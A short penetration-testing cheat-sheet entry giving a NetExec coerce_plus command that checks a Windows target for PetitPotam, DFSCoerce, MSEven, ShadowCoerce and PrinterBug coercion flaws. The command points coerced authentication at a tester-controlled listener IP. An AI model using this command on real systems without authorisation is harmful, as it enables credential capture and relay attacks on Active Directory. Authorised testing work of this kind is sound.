Check if the Target is vulnerable to any coerce vulns (PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug)
```
netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip
```
